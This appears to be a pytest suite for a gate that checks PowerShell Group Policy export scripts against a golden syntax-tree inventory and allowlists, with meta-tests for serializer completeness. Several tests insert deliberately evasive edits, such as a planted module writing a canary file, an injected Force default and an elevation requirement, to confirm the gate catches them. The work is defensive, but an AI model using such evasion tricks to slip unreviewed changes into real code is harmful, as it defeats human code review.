    exe = _pwsh()
    extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
    inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
    failed = _run_checks(base, inv)
    expected = _PROBE_EXPECTED_CHECK[probe_id]
    # The probe must be caught by its intended substantive check, not by a parse
    # error (NON-BL-3). The `using` probes deliberately fail parsing too, so
    # `parse` is tolerated only there.
    if "using" not in probe_id:
        assert "parse" not in failed, f"{probe_id}: flagged only by a parse error: {failed}"
    assert expected in failed, (
        f"{probe_id}: expected check {expected!r} did not flag it; raised {sorted(failed)}"
    )
    # Both layers: the edit also changes the committed syntax-tree inventory.
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], (
        f"{probe_id}: the golden syntax-tree inventory did not change"
    )


# AST-neutral or content-only edits with no write/exec/binding effect. Each one
# changes the golden tree and/or the source digest (and a statement's digest),
# so the structural layer catches it and a reviewer sees it, even though no
# allowlist/pin check fires on the edit itself.
_GOLDEN_ONLY: list[Probe] = [
    # Sol round-3 collision_return: a trailing `return` (old inventory: SAME).
    ("r3_trailing_return", "Export-GpoEstate.ps1", "append", "return\n"),
    # A changed log/progress message (content, not a write target).
    (
        "r4_message_text",
        "Export-GpoEstate.ps1",
        "replace",
        ('Write-Host "DryRun: would export the following:"', 'Write-Host "DryRun: would export:"'),
    ),
    # Sol round-5 top_level_exit: a trailing `exit 0` (documented top-level limit).
    ("r5s_top_level_exit", "Export-GpoEstate.ps1", "append", "exit 0\n"),
    # Comment-only edit: AST identical, source digest differs.
    ("r4_comment_only", "Run-GpoLensCollection.ps1", "append", "# reviewer note\n"),
]


@pytest.mark.parametrize("probe", _GOLDEN_ONLY, ids=[p[0] for p in _GOLDEN_ONLY])
def test_golden_catches_semantically_neutral_edits(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    inv = _modified_inventory(_pwsh(), base, position, snippet, tmp_path)
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], f"{probe_id}: golden did not change"
    if probe_id == "r4_comment_only":
        assert _canonical(inv[base])["ast"] == committed[base]["ast"]
    else:
        assert _canonical(inv[base])["ast"] != committed[base]["ast"]


# ---------------------------------------------------------------------------
# Completeness of the syntax-tree serialization (meta-tests).
# ---------------------------------------------------------------------------

# Projection completeness (Sol round 8 / adcs-lens): every (AST node type,
# serialized property) the dumper emits is either inspected by a named
# semantic check or declared inert with a reason. A new PowerShell property
# (runner upgrade) fails test_every_serialized_property_is_classified until a
# human classifies it. Keys are 'NodeType.Property'.
INSPECTED_OR_INERT: dict[str, str] = {
    "ArrayExpressionAst.SubExpression": "structural: golden + STATEMENT_DIGESTS",
    "ArrayLiteralAst.Elements": "structural: golden + STATEMENT_DIGESTS",
    "AssignmentStatementAst.Operator": "binding operator in _binding_key",
    "AssignmentStatementAst.Left": "binding target pinned by check_bindings/check_pinned_bindings",
    "AssignmentStatementAst.Right": "binding value pinned (check_pinned_bindings) + required-vars",
    "AttributeAst.TypeName": "check_ast: attributes serialized; no construction",
    "AttributeAst.PositionalArguments": "structural: golden + STATEMENT_DIGESTS",
    "AttributeAst.NamedArguments": "structural: golden + STATEMENT_DIGESTS",
    "AttributedExpressionAst.Attribute": "structural: golden + STATEMENT_DIGESTS",
    "AttributedExpressionAst.Child": "structural: golden + STATEMENT_DIGESTS",
    "BaseCtorInvokeMemberExpressionAst.Static": "refused by check_ast (class-only node)",
    "BaseCtorInvokeMemberExpressionAst.NullConditional": "refused by check_ast (class-only node)",
    "BaseCtorInvokeMemberExpressionAst.Expression": "refused by check_ast (class-only node)",
    "BaseCtorInvokeMemberExpressionAst.Member": "refused by check_ast (class-only node)",
    "BaseCtorInvokeMemberExpressionAst.GenericTypeArguments": "refused by check_ast (class node)",
    "BaseCtorInvokeMemberExpressionAst.Arguments": "refused by check_ast (class-only node)",
    "BinaryExpressionAst.Operator": "structural: golden + STATEMENT_DIGESTS",
    "BinaryExpressionAst.Left": "structural: golden + STATEMENT_DIGESTS",
    "BinaryExpressionAst.Right": "structural: golden + STATEMENT_DIGESTS",
    "BlockStatementAst.Kind": "node type refused by check_ast",
    "BlockStatementAst.Body": "node type refused by check_ast",
    "BreakStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "CatchClauseAst.IsCatchAll": "structural: golden + STATEMENT_DIGESTS",
    "CatchClauseAst.CatchTypes": "structural: golden + STATEMENT_DIGESTS",
    "CatchClauseAst.Body": "structural: golden + STATEMENT_DIGESTS",
    "CommandAst.InvocationOperator": "dynamic invocation (& / .) pinned by check_commands",
    "CommandAst.DefiningKeyword": "structural: golden + STATEMENT_DIGESTS",
    "CommandAst.CommandElements": "command name/args pinned by check_commands + _guarded_ops",
    "CommandAst.Redirections": "check_redirections",
    "CommandExpressionAst.Expression": "structural: golden + STATEMENT_DIGESTS",
    "CommandExpressionAst.Redirections": "check_redirections",
    "CommandParameterAst.ParameterName": "canonicalized + checked (common-param/task vectors)",
    "CommandParameterAst.Argument": "structural: golden + STATEMENT_DIGESTS",
    "ConfigurationDefinitionAst.ConfigurationType": "refused by check_ast (node type)",
    "ConfigurationDefinitionAst.InstanceName": "refused by check_ast (node type)",
    "ConfigurationDefinitionAst.Body": "refused by check_ast (node type)",
    "ConstantExpressionAst.Value": "structural: golden + STATEMENT_DIGESTS",
    "ContinueStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "ConvertExpressionAst.Type": "check_cast_types (inert cast allowlist)",
    "ConvertExpressionAst.Child": "structural: operand recursed",
    "DataStatementAst.Variable": "node type refused by check_ast",
    "DataStatementAst.CommandsAllowed": "node type refused by check_ast",
    "DataStatementAst.Body": "node type refused by check_ast",
    "DoUntilStatementAst.Label": "node type refused by check_ast",
    "DoUntilStatementAst.Body": "node type refused by check_ast",
    "DoUntilStatementAst.Condition": "node type refused by check_ast",
    "DoWhileStatementAst.Label": "node type refused by check_ast",
    "DoWhileStatementAst.Body": "node type refused by check_ast",
    "DoWhileStatementAst.Condition": "node type refused by check_ast",
    "DynamicKeywordStatementAst.CommandElements": "node type refused by check_ast",
    "ErrorExpressionAst.NestedAst": "refused by check_ast (parse error)",
    "ErrorStatementAst.Kind": "refused by check_ast (parse error)",
    "ErrorStatementAst.Flags": "refused by check_ast (parse error)",
    "ErrorStatementAst.Conditions": "refused by check_ast (parse error)",
    "ErrorStatementAst.Bodies": "refused by check_ast (parse error)",
    "ErrorStatementAst.NestedAst": "refused by check_ast (parse error)",
    "ExitStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
    "ExpandableStringExpressionAst.StringConstantType": "structural: golden + STATEMENT_DIGESTS",
    "ExpandableStringExpressionAst.Value": "check_remote_literals + golden",
    "ExpandableStringExpressionAst.NestedExpressions": "structural: golden + STATEMENT_DIGESTS",
    "FileRedirectionAst.FromStream": "check_redirections",
    "FileRedirectionAst.Append": "check_redirections",
    "FileRedirectionAst.Location": "check_redirections ($null only)",
    "ForEachStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "ForEachStatementAst.Flags": "check_ast refuses -Parallel",
    "ForEachStatementAst.Variable": "structural: golden + STATEMENT_DIGESTS",
    "ForEachStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
    "ForEachStatementAst.ThrottleLimit": "structural: golden + STATEMENT_DIGESTS",
    "ForEachStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
    "ForStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "ForStatementAst.Initializer": "structural: golden + STATEMENT_DIGESTS",
    "ForStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
    "ForStatementAst.Iterator": "structural: golden + STATEMENT_DIGESTS",
    "ForStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
    "FunctionDefinitionAst.IsFilter": "structural: golden + STATEMENT_DIGESTS",
    "FunctionDefinitionAst.IsWorkflow": "structural: golden + STATEMENT_DIGESTS",
    "FunctionDefinitionAst.Name": "structural: golden + STATEMENT_DIGESTS",
    "FunctionDefinitionAst.Parameters": "structural: golden + STATEMENT_DIGESTS",
    "FunctionDefinitionAst.Body": "structural: golden + STATEMENT_DIGESTS",
    "FunctionMemberAst.Name": "refused by check_ast (class node)",
    "FunctionMemberAst.MethodAttributes": "refused by check_ast (class node)",
    "FunctionMemberAst.IsPublic": "refused by check_ast (class node)",
    "FunctionMemberAst.IsPrivate": "refused by check_ast (class node)",
    "FunctionMemberAst.IsHidden": "refused by check_ast (class node)",
    "FunctionMemberAst.IsStatic": "refused by check_ast (class node)",
    "FunctionMemberAst.IsConstructor": "refused by check_ast (class node)",
    "FunctionMemberAst.Attributes": "refused by check_ast (class node)",
    "FunctionMemberAst.ReturnType": "refused by check_ast (class node)",
    "FunctionMemberAst.Parameters": "refused by check_ast (class node)",
    "FunctionMemberAst.Body": "refused by check_ast (class node)",
    "HashtableAst.KeyValuePairs": "structural: golden + STATEMENT_DIGESTS",
    "IfStatementAst.Clauses": "structural: golden + STATEMENT_DIGESTS",
    "IfStatementAst.ElseClause": "structural: golden + STATEMENT_DIGESTS",
    "IndexExpressionAst.NullConditional": "structural: golden + STATEMENT_DIGESTS",
    "IndexExpressionAst.Target": "index-write root pinned by check_bindings",
    "IndexExpressionAst.Index": "structural: golden + STATEMENT_DIGESTS",
    "InvokeMemberExpressionAst.Static": "static vs instance split in check_dotnet",
    "InvokeMemberExpressionAst.NullConditional": "in _guarded_ops text",
    "InvokeMemberExpressionAst.Expression": "method receiver pinned (check_instance_receivers)",
    "InvokeMemberExpressionAst.Member": "method call pinned by check_dotnet/_guarded_ops",
    "InvokeMemberExpressionAst.GenericTypeArguments": "in _guarded_ops text",
    "InvokeMemberExpressionAst.Arguments": "in _guarded_ops text + closure",
    "MemberExpressionAst.Static": "property access pinned by _guarded_ops",
    "MemberExpressionAst.NullConditional": "property access pinned by _guarded_ops (text)",
    "MemberExpressionAst.Expression": "property receiver pinned by _guarded_ops; recursed",
    "MemberExpressionAst.Member": "property access pinned by _guarded_ops (text+context)",
    "MergingRedirectionAst.FromStream": "check_redirections (stream merge only)",
    "MergingRedirectionAst.ToStream": "check_redirections (stream merge only)",
    "NamedAttributeArgumentAst.ArgumentName": "structural: golden + STATEMENT_DIGESTS",
    "NamedAttributeArgumentAst.ExpressionOmitted": "structural: golden + STATEMENT_DIGESTS",
    "NamedAttributeArgumentAst.Argument": "structural: golden + STATEMENT_DIGESTS",
    "NamedBlockAst.BlockKind": "structural: golden + STATEMENT_DIGESTS",
    "NamedBlockAst.Unnamed": "structural: golden + STATEMENT_DIGESTS",
    "NamedBlockAst.Statements": "structural: golden + STATEMENT_DIGESTS",
    "NamedBlockAst.Traps": "structural: golden + STATEMENT_DIGESTS",
    "ParamBlockAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
    "ParamBlockAst.Parameters": "structural: golden + STATEMENT_DIGESTS",
    "ParameterAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
    "ParameterAst.Name": "structural: golden + STATEMENT_DIGESTS",
    "ParameterAst.DefaultValue": "structural: golden + STATEMENT_DIGESTS",
    "ParenExpressionAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
    "PipelineAst.Background": "check_ast refuses background jobs",
    "PipelineAst.PipelineElements": "structural: golden + STATEMENT_DIGESTS",
    "PipelineChainAst.Operator": "node type refused by check_ast",
    "PipelineChainAst.Background": "check_ast refuses background jobs",
    "PipelineChainAst.LhsPipelineChain": "node type refused by check_ast",
    "PipelineChainAst.RhsPipeline": "node type refused by check_ast",
    "PropertyMemberAst.Name": "refused by check_ast (class node)",
    "PropertyMemberAst.PropertyAttributes": "refused by check_ast (class node)",
    "PropertyMemberAst.IsPublic": "refused by check_ast (class node)",
    "PropertyMemberAst.IsPrivate": "refused by check_ast (class node)",
    "PropertyMemberAst.IsHidden": "refused by check_ast (class node)",
    "PropertyMemberAst.IsStatic": "refused by check_ast (class node)",
    "PropertyMemberAst.PropertyType": "refused by check_ast (class node)",
    "PropertyMemberAst.Attributes": "refused by check_ast (class node)",
    "PropertyMemberAst.InitialValue": "refused by check_ast (class node)",
    "ReturnStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.ScriptRequirements": "check_ast refuses #Requires",
    "ScriptBlockAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.UsingStatements": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.ParamBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.DynamicParamBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.BeginBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.ProcessBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.EndBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockAst.CleanBlock": "structural: golden + STATEMENT_DIGESTS",
    "ScriptBlockExpressionAst.ScriptBlock": "structural: golden + STATEMENT_DIGESTS",
    "StatementBlockAst.Statements": "structural: golden + STATEMENT_DIGESTS",
    "StatementBlockAst.Traps": "structural: golden + STATEMENT_DIGESTS",
    "StringConstantExpressionAst.StringConstantType": "structural: golden + STATEMENT_DIGESTS",
    "StringConstantExpressionAst.Value": "check_remote_literals + golden",
    "SubExpressionAst.SubExpression": "structural: golden + STATEMENT_DIGESTS",
    "SwitchStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "SwitchStatementAst.Flags": "check_ast refuses any non-None switch flag",
    "SwitchStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
    "SwitchStatementAst.Clauses": "structural: golden + STATEMENT_DIGESTS",
    "SwitchStatementAst.Default": "structural: golden + STATEMENT_DIGESTS",
    "TernaryExpressionAst.Condition": "node type refused by check_ast",
    "TernaryExpressionAst.IfTrue": "node type refused by check_ast",
    "TernaryExpressionAst.IfFalse": "node type refused by check_ast",
    "ThrowStatementAst.IsRethrow": "structural: golden + STATEMENT_DIGESTS",
    "ThrowStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
    "TrapStatementAst.TrapType": "node type refused by check_ast",
    "TrapStatementAst.Body": "node type refused by check_ast",
    "TryStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
    "TryStatementAst.CatchClauses": "structural: golden + STATEMENT_DIGESTS",
    "TryStatementAst.Finally": "structural: golden + STATEMENT_DIGESTS",
    "TypeConstraintAst.TypeName": "check_cast_types / check_types",
    "TypeDefinitionAst.Name": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.TypeAttributes": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.IsEnum": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.IsClass": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.IsInterface": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.Attributes": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.BaseTypes": "refused by check_ast (class/enum node)",
    "TypeDefinitionAst.Members": "refused by check_ast (class/enum node)",
    "TypeExpressionAst.TypeName": "check_types denylist; static receiver via check_dotnet",
    "UnaryExpressionAst.TokenKind": "structural: golden + STATEMENT_DIGESTS",
    "UnaryExpressionAst.Child": "structural: golden + STATEMENT_DIGESTS",
    "UsingExpressionAst.SubExpression": "node type refused by check_ast",
    "UsingStatementAst.UsingStatementKind": "check_usings refuses all using statements",
    "UsingStatementAst.Name": "check_usings refuses all using statements",
    "UsingStatementAst.Alias": "check_usings refuses all using statements",
    "UsingStatementAst.ModuleSpecification": "check_usings refuses all using statements",
    "VariableExpressionAst.VariablePath": "variable refs pinned (check_bindings/pinned_bindings)",
    "VariableExpressionAst.Splatted": "splats in required-vars closure",
    "WhileStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
    "WhileStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
    "WhileStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
}


# Properties the serializer deliberately skips on every node type, and why.
_EXCLUDED_AST_PROPERTIES = {
    "*.Parent": "back-reference; structure is the row nesting",
    "*.Extent": "source position/text; the text is represented by the child nodes",
    "*.ErrorPosition": "source position of an operator token",
    "*.StaticType": "derived by the parser from the node type, constant or cast",
    "ConvertExpressionAst.Attribute": "the same object as ConvertExpressionAst.Type",
}
_KNOWN_REQUIREMENT_PROPERTIES = {
    "IsElevationRequired",
    "RequiredApplicationId",
    "RequiredAssemblies",
    "RequiredModules",
    "RequiredPSEditions",
    "RequiredPSVersion",
    "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
}


def test_every_serialized_property_is_classified() -> None:
    """adcs-lens projection completeness: every (node type, property) the
    serializer emits is either inspected by a named semantic check or declared
    inert (structural / refused node) with a reason in INSPECTED_OR_INERT. A new
    PowerShell property fails here until a human classifies it (so a
    side-effecting property can never be silently ignored by the floor)."""
    described = _run_dumper_raw(_pwsh(), [], "-Describe")
    pairs = {f"{node}.{prop}" for node, props in described["table"].items() for prop in props}
    missing = sorted(pairs - set(INSPECTED_OR_INERT))
    stale = sorted(set(INSPECTED_OR_INERT) - pairs)
    assert not missing, f"serialized (node, property) pairs not classified: {missing}"
    assert not stale, f"INSPECTED_OR_INERT has stale entries: {stale}"


def test_serializer_covers_every_ast_node_type() -> None:
    """Every concrete Ast type of the running PowerShell is in the serializer
    table, and every one of its public properties is serialized or excluded
    with a stated reason. A new PowerShell node type or property fails here.
    (A listed property this runtime lacks, e.g. ScriptBlockAst.CleanBlock before
    7.3, is skipped by the serializer, so it is not an error.)"""
    described = _run_dumper_raw(_pwsh(), [], "-Describe")
    table = described["table"]
    assert set(described["excluded"]) == set(_EXCLUDED_AST_PROPERTIES)
    problems: list[str] = []
    for node in described["ast_types"]:
        name = node["name"]
        if name not in table:
            problems.append(f"{name}: not in the serializer table")
            continue
        listed = set(table[name])
        for prop in node["properties"]:
            if prop in listed or f"*.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            if f"{name}.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            problems.append(f"{name}.{prop}: neither serialized nor excluded")
    assert not problems, "serializer table is incomplete:\n" + "\n".join(problems)
    unknown = set(described["script_requirements_properties"]) - _KNOWN_REQUIREMENT_PROPERTIES
    assert not unknown, f"new #Requires properties: {sorted(unknown)}"


# One construct per node type the collectors do not use, so the serializer is
# exercised on all of them (and the semantic layer's closed node set refuses
# them). Parsed only.
_EXOTIC_SOURCE = """#Requires -Version 5.1
using namespace System.Text
class GateBox : System.Object {
    [string] $Name = 'x'
    hidden static [int] $Count
    GateBox() { $this.Name = 'y' }
    [string] Show([int] $n) { return $this.Name * $n }
}
enum GateColor { Red = 1; Blue }
function Get-Gate { [CmdletBinding()] param([Parameter(Mandatory)][ValidateNotNull()] $a)
    dynamicparam { }
    begin { trap { continue } }
    process { do { $a-- } until ($a -lt 0); do { break } while ($false) }
    end { data GateData { 'x' }; $b = $a ? 1 : 2; Get-Item . && Get-Item .. || Get-Item / }
}
filter Test-Gate { $_ }
$x = [GateBox]::new(); $x.Show(2) | Out-Null
$s = { param($q) $using:q }
Start-Sleep 1 &
foreach -parallel ($i in 1..2) { $i }
switch -regex ('a') { 'a' { 1 } default { 2 } }
$h = @{ k = 1 }; $h['k'] += 2; [int]$h.k
"text $($h.k)" | Out-Null; @'
here
'@ | Out-Null
"""


def test_serializer_handles_every_node_type(tmp_path: Path) -> None:
    source = tmp_path / "exotic.ps1"
    source.write_bytes(_EXOTIC_SOURCE.encode("ascii"))
    entry = _run_dumper_raw(_pwsh(), [str(source)])[0]
    assert entry["unsupported_nodes"] == [], entry["unsupported_nodes"]
    lines = _canonical(entry)["ast"]
    assert lines[0].startswith("Script: ScriptBlockAst ScriptRequirements=")
    used = set(entry["node_types"])
    for kind in (
        "TypeDefinitionAst",
        "PropertyMemberAst",
        "FunctionMemberAst",
        "TrapStatementAst",
        "DataStatementAst",
        "TernaryExpressionAst",
        "PipelineChainAst",
        "UsingExpressionAst",
        "DoUntilStatementAst",
        "DoWhileStatementAst",
        "UsingStatementAst",
        "BaseCtorInvokeMemberExpressionAst",
    ):
        if kind == "BaseCtorInvokeMemberExpressionAst":
            continue  # only produced for `: base(...)`; covered by the table test
        assert kind in used, f"exotic source did not produce {kind}"
    # Every one of them is outside the closed node set.
    assert used - ALLOWED_NODE_TYPES


# Single-token mutations by token kind / operator text.
_OPERATOR_SWAPS = {
    "-eq": "-ne",
    "-ne": "-eq",
    "-or": "-and",
    "-and": "-or",
    "-band": "-bor",
    "-bor": "-band",
    "-gt": "-ge",
    "-ge": "-gt",
    "-lt": "-le",
    "-le": "-lt",
    "-match": "-notmatch",
    "-notmatch": "-match",
    "-like": "-notlike",
    "-notlike": "-like",
    "-contains": "-notcontains",
    "-notcontains": "-contains",
    "-in": "-notin",
    "-notin": "-in",
    "-is": "-isnot",
    "-isnot": "-is",
    "-not": "-bnot",
    "-replace": "-creplace",
    "-split": "-csplit",
    "-join": "-split",
    "-f": "-join",
    "+": "-",
    "-": "+",
    "*": "/",
    "/": "*",
    "=": "+=",
    "+=": "=",
    "++": "--",
    "--": "++",
    "2>": "3>",
    "*>&1": "*>&2",
    "break": "continue",
    "continue": "break",
}


def _token_mutation(token: dict[str, Any]) -> str | None:
    kind, text = token["kind"], token["text"]
    if kind in ("Variable", "SplattedVariable"):
        return text[:-1] + "Q}" if text.endswith("}") else text + "Q"
    if kind == "Parameter":
        return text[:-1] + "Q:" if text.endswith(":") else text + "Q"
    if kind == "Number":
        return "8" if text == "7" else "7"
    if kind in ("StringLiteral", "StringExpandable"):
        return text[0] + "Q" + text[1:]
    if kind in ("HereStringLiteral", "HereStringExpandable"):
        cut = text.index("\n") + 1
        return text[:cut] + "Q" + text[cut:]
    if kind in ("Identifier", "Generic"):
        return text + "Q"
    return _OPERATOR_SWAPS.get(text.casefold())


def _evenly(items: list[Any], count: int) -> list[Any]:
    if len(items) <= count:
        return list(items)
    step = (len(items) - 1) / (count - 1)
    return [items[round(i * step)] for i in range(count)]


def _mutants(source: str, sites: dict[str, Any]) -> list[tuple[str, str]]:
    """(label, mutated source) pairs that must each change the syntax tree."""
    out: list[tuple[str, str]] = []
    tokens = [t for t in sites["tokens"] if _token_mutation(t) is not None]
    for t in _evenly(tokens, 40):
        new = _token_mutation(t)
        assert new is not None
        out.append(
            (
                f"token {t['kind']} {t['text']!r}@{t['start']}",
                source[: t["start"]] + new + source[t["end"] :],
            )
        )
    swaps = []
    for s1, e1, s2, e2 in sites["siblings"]:
        if _norm(source[s1:e1]) != _norm(source[s2:e2]):
            swaps.append((s1, e1, s2, e2))
    for s1, e1, s2, e2 in _evenly(swaps, 15):
        swapped = source[:s1] + source[s2:e2] + source[e1:s2] + source[s1:e1] + source[e2:]
        out.append((f"swap statements @{s1}/{s2}", swapped))
    for start, end in _evenly(list(sites["conditions"]), 12):
        out.append(
            (
                f"negate condition @{start}",
                source[:start] + "-not (" + source[start:end] + ")" + source[end:],
            )
        )
    inserts = [*_evenly(list(sites["block_starts"]), 3), len(source)]
    for pos in inserts:
        for label, stmt in (
            ("index assignment", "$PSDefaultParameterValues['Get-Item:Force'] = $true\n"),
            ("return", "return\n"),
        ):
            sep = "" if pos == 0 or source[pos - 1] in "\n " else "\n"
            out.append((f"insert {label} @{pos}", source[:pos] + sep + stmt + source[pos:]))
    out.append(("#Requires module", "#Requires -Modules GpoLensProbe\n" + source))
    out.append(("#Requires elevation", "#Requires -RunAsAdministrator\n" + source))
    return out


_ANCESTOR_BASE = """function Get-Probe {
  [CmdletBinding()]
  param([string]$p)
  if ($p -eq 'x') {
    foreach ($i in @(1)) {
      try {
        switch ($i) { 1 { Write-Output 'probe-inner' } }
      } catch [System.Exception] { }
    }
  }
}
"""
_ANCESTOR_MUTATIONS = {
    "block-kind": ("  if ($p -eq 'x') {", "  process {\n  if ($p -eq 'x') {", "BLOCK"),
    "function-name": ("function Get-Probe {", "function Get-Other {", ""),
    "parameter": ("param([string]$p)", "param([int]$p)", ""),
    "attribute": ("  [CmdletBinding()]\n", "", ""),
    "if-condition": ("if ($p -eq 'x')", "if ($p -ne 'x')", ""),
    "foreach-variable": ("foreach ($i in @(1))", "foreach ($j in @(1))", ""),
    "foreach-source": ("foreach ($i in @(1))", "foreach ($i in @(2))", ""),
    "catch-type": ("catch [System.Exception]", "catch [System.IO.IOException]", ""),
    "switch-condition": ("switch ($i)", "switch ($i + 1)", ""),
    "switch-flag": ("switch ($i)", "switch -Regex ($i)", ""),
    "switch-pattern": ("{ 1 { Write", "{ 2 { Write", ""),
    "scriptblock-nesting": (
        "{ 1 { Write-Output 'probe-inner' } }",
        "{ 1 { & { Write-Output 'probe-inner' } } }",
        "",
    ),
}


def _probe_statement_digest(entry: dict[str, Any]) -> str:
    """The digest of the innermost `Write-Output 'probe-inner'` statement."""
    rows = entry["ast_rows"]
    paths = _row_index_paths(rows)
    digests = _statement_digests(entry)
    best: tuple[int, str] | None = None
    for i, row in enumerate(rows):
        if row[1] != "Statements":
            continue
        j = i + 1
        while j < len(rows) and int(rows[j][0]) > int(row[0]):
            j += 1
        sub = rows[i:j]
        if any(
            r[2] == "StringConstantExpressionAst"
            and ["Value", "probe-inner"] in [list(a) for a in r[3]]
            for r in sub
        ):
            if best is None or len(sub) < best[0]:
                best = (len(sub), ".".join(str(x) for x in paths[i]))
    assert best is not None
    return digests[best[1]]


def test_statement_digest_covers_every_ancestor_property(tmp_path: Path) -> None:
    """Sol round 9 / adcs-lens: each ancestor-context property — begin/process/
    end block kind, function name, parameters, attributes, if condition, foreach
    variable and source, catch type, switch condition/flag/pattern, scriptblock
    nesting — changes the digest of a statement nested beneath it (so wrapping
    the root body in a process block no longer leaves digests unchanged)."""
    exe = _pwsh()
    files = [tmp_path / "base.ps1"]
    files[0].write_text(_ANCESTOR_BASE, encoding="utf-8")
    for name, (old, new, tail) in _ANCESTOR_MUTATIONS.items():
        assert _ANCESTOR_BASE.count(old) == 1, name
        text = _ANCESTOR_BASE.replace(old, new, 1)
        if tail == "BLOCK":  # close the new process block before the function's brace
            text = text[: text.rindex("}")] + "}\n}\n"
        f = tmp_path / f"{name}.ps1"
        f.write_text(text, encoding="utf-8")
        files.append(f)
    dumps = _run_dumper_raw(exe, [str(f) for f in files])
    assert all(not d["parse_errors"] for d in dumps), [d["parse_errors"] for d in dumps]
    base = _probe_statement_digest(dumps[0])
    unchanged = [
        name
        for name, d in zip(_ANCESTOR_MUTATIONS, dumps[1:], strict=True)
        if _probe_statement_digest(d) == base
    ]
    assert not unchanged, (
        f"ancestor mutations that left the statement digest unchanged: {unchanged}"
    )


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> None:
    """Generic completeness evidence: for each collector, mutate the source in
    systematic ways — change single tokens (evenly sampled over every mutable
    token: variables, parameters, numbers, strings, here-strings, identifiers,
    command names, operators, redirections, keywords), swap adjacent
    statements, negate conditions, insert an index assignment / `return`, add
    `#Requires` — and require the serialized syntax tree to differ for every
    mutant that still parses. Comment/whitespace-only edits must leave the tree
    unchanged but change the source digest, and so must CRLF line endings
    (the digest is over exact bytes; .gitattributes pins LF and check_ast
    refuses CR)."""
    exe = _pwsh()
    path = _SCRIPTS / script
    source = path.read_bytes().decode("ascii")
    sites = _run_dumper_raw(exe, [str(path)], "-Sites")[0]
    original = _canonical(_run_dumper_raw(exe, [str(path)], "-AstOnly")[0])
    mutants = _mutants(source, sites)
    files: list[Path] = []
    for i, (_label, text) in enumerate(mutants):
        target = tmp_path / f"m{i:04d}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    neutral = {
        "comment": "# reviewer comment\n" + source,
        "whitespace": "\n\n" + source.replace("\n", "  \n", 1),
        "crlf": source.replace("\n", "\r\n"),
    }
    for name, text in neutral.items():
        target = tmp_path / f"neutral-{name}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    results = _run_dumper_raw(exe, [str(f) for f in files], "-AstOnly", timeout=2400)
    by_path = {Path(r["path"]).name: _canonical(r) for r in results}
    undetected: list[str] = []
    clean = 0
    for i, (label, _text) in enumerate(mutants):
        mutant = by_path[f"m{i:04d}.ps1"]
        if mutant["parse_errors"]:
            continue
        clean += 1
        if mutant["ast"] == original["ast"]:
            undetected.append(label)
    assert not undetected, f"{script}: mutations not reflected in the syntax tree: {undetected}"
    assert clean >= len(mutants) * 0.6, f"{script}: only {clean}/{len(mutants)} mutants parsed"
    for name in ("comment", "whitespace"):  # AST-neutral by construction
        changed = by_path[f"neutral-{name}.ps1"]
        assert changed["ast"] == original["ast"], f"{script}: {name}-only edit changed the tree"
        assert changed["source_sha256"] != original["source_sha256"], name
    crlf = by_path["neutral-crlf.ps1"]
    assert crlf["source_sha256"] != original["source_sha256"], f"{script}: CRLF not detected"


def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The generator writes only the golden file. The semantic policy tables
    (POLICIES, PINNED_VARS, GUARDED_OPS, LOCAL_FUNCTION_BODIES, ...) are hand-
    maintained in this file, so a regeneration can never widen them."""
    import inspect

    generator = (_REPO / "scripts" / "gen_collector_inventory.py").read_text(encoding="utf-8")
    for token in (
        "PINNED_VARS",
        "GUARDED_OPS",
        "LOCAL_FUNCTION_BODIES",
        "STATEMENT_DIGESTS",
        "PIPELINE_INPUTS",
        "REMOTE_LITERALS",
        "SECRET_USES",
        "SCRIPT_HEADERS",
        "POLICIES",
        "write_text",
        "write_bytes",
        "open(",
    ):
        assert token not in generator, f"generator must not touch {token}"
    # The print-only helper is also forbidden from writing and from being wired
    # into the generator.
